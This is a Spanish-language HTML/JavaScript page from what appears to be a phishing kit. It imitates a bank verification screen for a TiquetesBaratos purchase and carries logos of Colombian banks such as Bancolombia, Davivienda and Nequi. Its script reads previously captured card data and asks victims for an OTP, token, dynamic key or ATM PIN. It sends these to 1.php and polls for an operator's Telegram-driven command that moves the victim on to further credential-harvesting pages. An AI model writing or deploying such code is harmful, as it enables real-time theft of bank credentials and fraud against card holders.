<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      background: url('lgos/1.jpg') center/cover no-repeat;
      backdrop-filter: blur(6px);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .token-container {
      background: white;
      max-width: 420px;
      width: 92%;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.08);
      position: relative;
    }
    .logos-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 10px;
    }
    .logo-card, .logo-bank {
      max-height: 40px;
      object-fit: contain;
    }

    /* Estilos individuales por banco */
    .logo-bank.bancolombia { max-height: 38px; max-width: 120px; }
    .logo-bank.davivienda { max-height: 42px; max-width: 125px; }
    .logo-bank.bbva { max-height: 35px; max-width: 100px; }
    .logo-bank.bogota { max-height: 38px; max-width: 130px; }
    .logo-bank.colpatria { max-height: 60px; max-width: 135px; }
    .logo-bank.falabella { max-height: 32px; max-width: 110px; }
    .logo-bank.cajasocial { max-height: 37px; max-width: 120px; }
    .logo-bank.avvillas { max-height: 36px; max-width: 110px; }
    .logo-bank.popular { max-height: 50px; max-width: 120px; }
    .logo-bank.itau { max-height: 54px; max-width: 100px; }
    .logo-bank.serfinanza { max-height: 39px; max-width: 115px; }
    .logo-bank.nequi { max-height: 60px; max-width: 115px; }

    h2 {
      font-size: 22px;
      color: #000;
    }
    p {
      font-size: 15px;
      color: #333;
      margin: 10px 0;
    }
    .code-label {
      margin-top: 25px;
      font-weight: 500;
      color: #555;
      font-size: 14px;
    }
    #token-code {
      width: 100%;
      font-size: 26px;
      padding: 12px 10px;
      margin-top: 8px;
      border-radius: 6px;
      border: 1px solid #ccc;
      text-align: center;
      letter-spacing: 4px;
    }
    #token-code.error {
      border: 2px solid red !important;
    }
    .btn-confirm {
      margin-top: 25px;
      width: 100%;
      background-color: #0052cc;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
    }
    .btn-confirm:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .resend {
      text-align: center;
      margin-top: 15px;
    }
    .resend a {
      font-size: 14px;
      color: #0052cc;
      text-decoration: none;
    }
    .resend a:hover {
      text-decoration: underline;
    }
    .loaderp-full {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(255,255,255,0.85);
      z-index: 9999;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .loaderp-full.hidden {
      display: none;
    }
    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<div class="loaderp-full hidden" id="loader"><div class="spinner"></div></div>

<div class="token-container">
  <div class="logos-top">
    <img src="img/bank/defaultcard.png" alt="Tarjeta" class="logo-card" id="logo-tipo-tarjeta" />
    <img src="img/bank/default.png" alt="Banco" class="logo-bank" id="logo-banco" />
  </div>

  <h2 id="titulo">Verificación</h2>
  <p id="mensaje">Autorizando transacción...</p>
  <p>
    <strong>  TiquetesBaratos  </strong><br/>
    Monto: <span id="monto">$0</span><br/>
    Tarjeta terminada en <span id="ultimos4">****</span>
  </p>

  <label class="code-label" for="token-code" id="etiqueta-codigo">Código</label>
  <!-- 🔹 Cambié maxlength a 8 para que tanto token como otp permitan hasta 8 -->
  <input type="text" id="token-code" maxlength="8" placeholder="______" />
  <button class="btn-confirm" id="confirmar-btn" disabled>CONFIRMAR</button>

  <div class="resend">
    <a href="#" onclick="reenviarCodigo()">Reenviar código</a>
  </div>
</div>

<script>
  const input = document.getElementById('token-code');
  const btn = document.getElementById('confirmar-btn');
  const loader = document.getElementById("loader");

  const infoload   = JSON.parse(localStorage.getItem('infoload') || "{}");
  const tipeObj    = JSON.parse(localStorage.getItem("TIPE") || "{}");
  const tbdatos    = JSON.parse(localStorage.getItem("tbdatos") || "{}"); 
  const montoTotal = localStorage.getItem("total_pagar") || "0";

  const tipoTarjeta = (tipeObj.tipo || '').toLowerCase();
  const bancoNombre = tbdatos.banco || infoload.bank || 'default';

  // ---------------------------------------------------------------
  // MAPAS DE CONFIGURACIÓN
  // ---------------------------------------------------------------
  
  const BANCOS_MAP = {
    "bancolombia": "dinamica",
    "davivienda": "otp",
    "bbva": "token",
    "bogota": "dinamica",
    "colpatria": "token",
    "scotiabank": "token",
    "av villas": "otp",
    "avvillas": "otp",
    "popular": "token",
    "nequi": "otp",
    "caja social": "otp",
    "serfinanza": "otp",
    "itau": "token",
    "falabella": "token"
  };

  const TITULOS = {
    token: "Verificación de token",
    dinamica: "Verificación dinámica",
    otp: "Verificación OTP",
    cajero: "Clave de cajero"
  };

  const MENSAJES = {
    token: "Por favor ingresa el token enviado por mensaje de texto o generado por tu app móvil.",
    dinamica: "Ingresa la clave dinámica enviada por mensaje o desde tu app móvil.",
    otp: "Ingresa el código OTP enviado por mensaje de texto (6 a 8 dígitos).",
    cajero: "Ingresa la clave de cajero."
  };

  const MAXLENGTH = {
    token: 8,
    dinamica: 6,
    otp: 8,
    cajero: 4
  };

  // ---------------------------------------------------------------
  // LÓGICA DE INICIALIZACIÓN
  // ---------------------------------------------------------------

  function detectarTipoPorBanco(nombreBanco) {
    const banco = (nombreBanco || "").toLowerCase();
    for (const key in BANCOS_MAP) {
      if (banco.includes(key)) return BANCOS_MAP[key];
    }
    return "token";
  }

  let tipoDetectado = detectarTipoPorBanco(bancoNombre);
  let tipo = new URLSearchParams(window.location.search).get('tipo') || tipoDetectado;
  sessionStorage.setItem("tipo-forzado", tipo);

  function detectarBanco(nombre) {
    const banco = (nombre || "").toLowerCase();
    const listaBancos = ["bancolombia", "davivienda", "bbva", "bogota", "colpatria", "falabella", "cajasocial", "avvillas", "popular", "itau", "serfinanza", "nequi"];
    for(let b of listaBancos) {
      if(banco.includes(b)) return b;
    }
    if (banco.includes("bogotá")) return "bogota";
    if (banco.includes("scotiabank")) return "colpatria";
    if (banco.includes("caja social")) return "cajasocial";
    if (banco.includes("av villas")) return "avvillas";
    return "default";
  }

  // Interfaz de Usuario
  document.getElementById("logo-tipo-tarjeta").src =
    tipoTarjeta.includes("visa") ? "img/bank/visa.png" :
    tipoTarjeta.includes("master") ? "img/bank/master.png" :
    "img/bank/defaultcard.png";

  const bancoDetectado = detectarBanco(bancoNombre);
  const logoBanco = document.getElementById("logo-banco");
  logoBanco.src = bancoDetectado === "default" ? "img/bank/sincc.png" : `img/bank/${bancoDetectado}.png`;
  
  document.getElementById("titulo").innerText = TITULOS[tipo] || "Verificación";
  document.getElementById("mensaje").innerText = MENSAJES[tipo] || "Confirma tu transacción ingresando el código.";
  input.setAttribute("maxlength", MAXLENGTH[tipo] || 6);
  document.getElementById("monto").innerText = formatearMonto(montoTotal);
  document.getElementById("ultimos4").innerText = (tbdatos.cardNumber || tbdatos.tarjeta || "").slice(-4) || "****";

  // ---------------------------------------------------------------
  // EVENTOS Y POLLING
  // ---------------------------------------------------------------

  input.addEventListener('input', () => {
    const val = input.value.trim().length;
    if (tipo === "otp" || tipo === "token") {
      btn.disabled = (val < 6 || val > 8);
    } else {
      btn.disabled = val !== parseInt(input.maxLength);
    }
    input.classList.remove("error");
  });

  document.getElementById('confirmar-btn').addEventListener('click', async () => {
    loader.classList.remove("hidden");
    input.disabled = true;
    btn.disabled = true;

    // Usar transactionId existente o generar uno nuevo
    let transactionId = tbdatos.transactionId || Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    const payload = {
      ...tbdatos,
      transactionId,
      tipo,
      codigo: input.value.trim(),
      total_pagar: montoTotal
    };

    try {
      await fetch('1.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      await esperarRespuestaTelegram(transactionId, tipo);
    } catch (error) {
      console.error("❌ Error al enviar:", error.message);
      loader.classList.add("hidden");
    }
  });

  async function esperarRespuestaTelegram(transactionId, tipoEnviado) {
    while (true) {
      try {
        const res = await fetch(`1.php?transactionId=${transactionId}`);
        const json = await res.json();

        if (json.ok && json.action) {
          loader.classList.add("hidden");

          // Lógica de redirección según la acción de Telegram
          if (json.action === `pedir_${tipoEnviado}`) {
            input.classList.add("error");
            input.value = "";
            input.disabled = false;
            btn.disabled = true;
            alert("Código incorrecto, por favor verifique.");
          } 
          else if (json.action.startsWith("pedir_")) {
            window.location.href = `token-id.php?tipo=${json.action.replace("pedir_", "")}`;
          } 
          else if (json.action === "ya") {
            window.location.href = "/informacion/finish.php";
          } 
          else if (json.action === "cc") {
            window.location.href = "/informacion/pse/alter.php";
          } 
          else if (json.action === "logo") {
            window.location.href = "3d.php"; // Página para validación de logo/3DS
          }
          else {
            window.location.href = json.action;
          }
          break;
        }
        await new Promise(r => setTimeout(r, 2000));
      } catch (err) {
        console.error("Polling error:", err.message);
        break;
      }
    }
  }

  function formatearMonto(valor) {
    const n = parseInt(valor);
    return isNaN(n) ? "$0" : n.toLocaleString('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 });
  }
</script>
</body>
</html>
